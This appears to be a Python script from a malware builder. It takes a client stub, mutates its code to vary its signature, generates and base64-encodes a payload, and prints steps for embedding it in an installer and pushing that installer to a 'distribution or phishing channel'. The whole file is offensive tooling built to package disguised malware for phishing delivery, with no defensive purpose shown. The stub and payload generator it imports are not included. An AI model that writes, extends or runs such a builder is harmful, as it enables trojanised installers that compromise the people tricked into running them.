import os
import base64
from builder.payload_generator import generate_payload
from builder.mutator import mutate_code

def create_payload(config, output_stub="build/stub.py", output_b64="build/payload.b64"):
    with open("client/stub.py", "r") as f:
        raw = f.read()
    mutated = mutate_code(raw)
    with open(output_stub, "w") as f:
        f.write(mutated)
    generate_payload(config, output_stub)

    with open(output_stub, "rb") as f:
        encoded = base64.b64encode(f.read())
    with open(output_b64, "wb") as f:
        f.write(encoded)

def deploy_campaign(config):
    os.makedirs("build", exist_ok=True)
    create_payload(config)
    print("[✓] Payload built and encoded.")
    print("[*] Now integrate payload.b64 into desired installer.")
    print("[*] Push staged installer to distribution or phishing channel.")
